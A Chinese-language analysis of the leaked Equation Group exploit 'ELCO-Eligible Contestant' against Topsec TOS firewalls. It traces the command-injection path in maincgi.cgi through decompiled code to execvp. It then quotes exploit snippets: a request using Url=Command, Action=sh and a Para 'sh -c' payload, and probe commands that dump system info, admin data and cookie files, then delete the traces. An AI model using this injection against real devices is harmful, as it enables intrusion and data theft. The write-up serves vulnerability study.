# 天融信ELCO-Eligible Contestant漏洞利用分析

## 一、漏洞概述

### 1. 漏洞简介

天融信是中国领先的信息安全产品与服务解决方案提供商。基于创新的 “可信网络架构”以及业界领先的信息安全产品与服务，天融信致力于改善用户网络与应用的可视性、可用性、可控性和安全性，降低安全风险，创造业务价值   

近期NSA方程式组织被泄漏出的针对天融信防火墙的漏洞利用中，有一处名为`ELCO-Eligible Contestant`的漏洞  

该漏洞是TOS系统中入口文件`maincgi.cgi`文件里处理post请求产生的一个`命令执行漏洞`

### 2. 漏洞影响
攻击者可以在通过构造特定post请求，在防火墙设备上执行任意命

### 3. 漏洞触发条件
版本：TOS `3.3.005.057.1` to `3.3.010.024.1`  
端口：port `443` open  
硬件：not `ARM` based firewalls  

## 二、漏洞原理分析
该漏洞是`maincgi.cgi`文件处理post请求存在缺陷导致漏洞的产生，主函数调用逻辑大致如下：  

```
int __cdecl main()
{
	......
	printf("Cache-Control: no-cache\r\n");
	printf("Pragma: no-cache\r\n");
	v17 = (int)getenv("HTTP_COOKIE");
	//接下来几个调用为关键点
	//关键点1
	sub_815AD34();
	//关键点2
	cgiFormStringNoNewlines((int)"Url", &s1, 32);
	if ( !strcmp(&s1, "Command") )
	{
	  cgi_init_headers();
	  //关键点3
	  sub_8105F42();
	  return 0;
	}
}
```

关键点1，跟进到`sub_815AD34()`：
```
signed int sub_815AD34()
{
  _BYTE *k; // [sp+18h] [bp-10h]@13
  char *i; // [sp+1Ch] [bp-Ch]@7
  
  ......
  
  //关键点1.1
  sub_815B140((int)&dword_823A974, "REQUEST_METHOD");
  ......
  
  //关键点1.2
  if ( !sub_815E67F(dword_823A974, "post") )
  {
    if ( sub_815E67F(dword_823A974, "get") )
    {
      n = strlen(dword_823ADC0);
      if ( sub_815C398() )
      {
        cgiFreeResources();
        return -1;
      }
    }
    goto LABEL_29;
	
	......

LABEL_29:
    dword_822F1B4 = 1;
    return 0;
  }
}
```
关键点1.1，和请求方式有关，跟进到函数`sub_815B140()`：  
```
调用：sub_815B140((int)&dword_823A974, "REQUEST_METHOD");

int __cdecl sub_815B140(int a1, char *name)
{
  int result; // eax@1

  *(_DWORD *)a1 = getenv(name);
  result = a1;
  
  if ( !*(_DWORD *)a1 )
  {
    result = a1;
    *(_DWORD *)a1 = &byte_81F9374;
  }
  return result;
}
```
形参`a1`即`dword_823A974`的地址，name指针为"REQUEST_METHOD"的首地址，系统函数`getenv()`返回name指向的环境变量的具体值，并赋值给a1即dword_823A974。当请求为post时，变量`dword_823A974`将获得字符串`"post"`的首地址。   

回到关键点1.2，此时dword_823A974指向了"post"，跟进到`sub_815E67F()`中：  
```
调用：sub_815E67F(dword_823A974, "post");

int __cdecl sub_815E67F(_BYTE *a1, _BYTE *a2)
{
  int v2; // ebx@6

  while ( 1 )
  {
    if ( !*a1 )
      return *a2 == 0;
    if ( !*a2 )
      return 0;
    if ( !(*(_WORD *)(_ctype_b + 2 * *a1) & 0x400) )
      break;
    v2 = tolower(*a1);
    if ( v2 != tolower(*a2) )
      return 0;
LABEL_10:
    ++a1;
    ++a2;
  }
  if ( *a1 == *a2 )
    goto LABEL_10;
  return 0;
}
```
该函数用移动字符指针的方式，依次比较两个参数所指向字符串的每一个字符，并且只进行小写比较，最终返回0  

这样就进入关键点1.2的if语句块，经过goto到LABEL_29，再返回0  

回到main()中，关键点2，跟进`cgiFormStringNoNewlines()`
```
调用：cgiFormStringNoNewlines((int)"Url", &s1, 32);

int __cdecl cgiFormStringNoNewlines(int a1, char *dest, int a3)
{
  signed int v4; // [sp+10h] [bp-8h]@2
  const char **v5; // [sp+14h] [bp-4h]@1
  //关键点2.1
  v5 = sub_815E7CD((char *)a1);
  if ( v5 )
  {
	//关键点2.2
    v4 = sub_815D063((int)v5, dest, a3, 0);
  }
  else
  {
    strcpy(dest, &byte_81F9374);
    v4 = 4;
  }
  return v4;
}
```
形参a1指向`"Url"`，跟进关键点2.1处，`sub_815E7CD()`：  
```
调用：v5 = sub_815E7CD((char *)a1);

const char **__cdecl sub_815E7CD(char *a1)
{
  dword_822F1B8 = a1;
  dword_822F1BC = dword_8238840;
  return sub_815E7EC();
}
```
`dword_822F1B8`指向`"Url"`，跟进`sub_815E7EC()`：  
```
const char **sub_815E7EC()
{
  const char **v2; // [sp+14h] [bp-4h]@2

  while ( dword_822F1BC )
  {
    v2 = (const char **)dword_822F1BC;
    dword_822F1BC = *(_DWORD *)(dword_822F1BC + 24);
    if ( !strcmp(*v2, dword_822F1B8) )
      return v2;
  }
  return 0;
}
```
上面函数返回后，v5不为0，进入if语句块  

关键点2.2，跟进`sub_815D063()`：  
```
调用：sub_815D063((int)v5, dest, a3, 0);

signed int __cdecl sub_815D063(int a1, _BYTE *a2, int a3, int a4)
{
	 signed int v5;
	 int v7;
	 _BYTE *i; // [sp+20h] [bp-8h]@1
	 _BYTE *v14; // [sp+24h] [bp-4h]@1
	 ......
	 v12 = 0;
	 v11 = 0;
	 v10 = a3 - 1;
	 //目标字符串空间首地址
	 v14 = a2;
	 //检测是否读到行尾，v7取得当前指向字符的地址值
	 for ( i = *(_BYTE **)(a1 + 4); ; ++i )
	 {
	   v7 = *i;
	   if ( v7 != 13 && v7 != 10 )
	     break;
	   if ( v7 == 13 )
	     ++v9;
	   else
	     ++v8;
	LABEL_22:
	   ;
	 }
	 ......
	 if ( !v7 )
	    goto LABEL_23;
	 //复制每一个字符到目标字符串空间，也就是dest
	 if ( v11 < v10 )
	 {
	   *v14++ = v7;
	   ++v11;
	   goto LABEL_22;
	 }
	 ......
	 return v5;
}
```
函数返回后，回到关键点2，调用`cgiFormStringNoNewlines((int)"Url", &s1, 32);`后`s1`将指向post请求中传递的参数`Url`所对应的字符串首地址  

关键点2下面的if语句块，当参数Url传进的字符是`"Command"`时，将进入函数体内：  
```
if ( !strcmp(&s1, "Command") )
{
	......
}
```
关键点3，跟进`sub_8105F42()`：  
```
signed int sub_8105F42()
{
  ......
  char *argv; // [sp+30h] [bp-328h]@16
  ......
  char file; // [sp+2B0h] [bp-A8h]@1
  char s; // [sp+2D0h] [bp-88h]@1
  memset(&s, 0, 0x80u);
  //跟前面的分析一样，下面两个调用后，file、s分别获得参数Action、Para的字符串值的首地址字符
  cgiFormStringNoNewlines((int)"Action", &file, 32);
  cgiFormStringNoNewlines((int)"Para", &s, 128);
  ......
  pid = fork();
  if ( !pid )
  {
    close(pipedes);
    dup2(fd, 1);
    dup2(fd, 2);
	
	//接下来将字符s直到'\0'前整个字符串依次赋给argv所指向的字符数组
    v7 = &s;
    v6 = &s;
    v5 = 0;
    while ( *v6 )
    {
      if ( *v6 == 32 )
      {
        *v6 = 0;
        (&argv)[4 * v5++] = v7;
        v7 = ++v6;
      }
      else if ( !*++v6 )
      {
        (&argv)[4 * v5] = v7;
        v4[v5] = 0;
      }
    }
    //关键点，执行系统PATH路径中，file所指向名字的程序，并传递argv指向的参数值给该程序
    //该函数两个参数均由post请求提交，均可控
    execvp(&file, &argv);
```
如果file指向`"sh -c"`，argv指向`"ls"`等系统命令，那么就能达到执行任意系统命令的目的。



## 三、漏洞利用分析
```
.....
def touch(self,resp=None):
    out = []
    if not resp:
        resp = self.head(self.target_url)
    if 'etag' in resp.headers:
        etag,date = self._parse_etag(resp.headers['etag'])
        ##

        out.append("Etag - %s; Last modified - %s" % (etag,date))
    self.timeout = None
    return out
```
获取`etag`标识和修改时间   
```
def probe(self):
    temp = randstr(7)
    ##

    self.log.info("Scheduling cleanup in 60 seconds...")
    self._run_cmd("( sleep 60 && rm -f /www/htdocs/site/pages/.%s )" % temp)

    self.log.info("Probing system and retrieving target info...")
    ##

    self._run_cmd("( cat /e*/is* && uname -a && /t*/b*/cfgt* system admininfo showonline && cat /*/*coo*/* )>/www/htdocs/site/pages/.%s"% temp)
    res = self.get("/site/pages/.%s" % temp)
    self.log.info("System information retrieved:\n"+res.content)

    self.log.info("Forcing removal of temp file from target now...")
    self._run_cmd("killall sleep && rm -f /www/htdocs/site/pages/.%s" % temp)
    if res.content.find("i686") == -1:
        return "System does not appear to be x86. Probably not exploitable."
    if res.content.find("tospass") != -1 or res.content.find("superman") != -1:
        self.log.warning("User may be logged in. PLEASE REVIEW SYSTEM INFO")
```
探测目标是否可以利用，如果不是x86体系结构也不能利用  
```
def _run_cmd(self,cmd,content=None,**kwargs):
    params = {
                "Url":"Command",
                "Action":"sh",
                "Para":"sh -c "+cmd.replace(" ","\t")
    }
    if content:
        c = StringIO(content)
        kwargs['data'],kwargs['files'] = params,{randstr(5):c}
        //post提交
        return self.post(self.exploit_url,**kwargs)
    else:
        kwargs['params'] = params
        return self.get(self.exploit_url,**kwargs)
```
Exp的主要逻辑，通过构造post请求，提交前面提到的Url、Action、Para等主要参数  

通过向`sh`程序传递shell指令，达到任意命令执行   
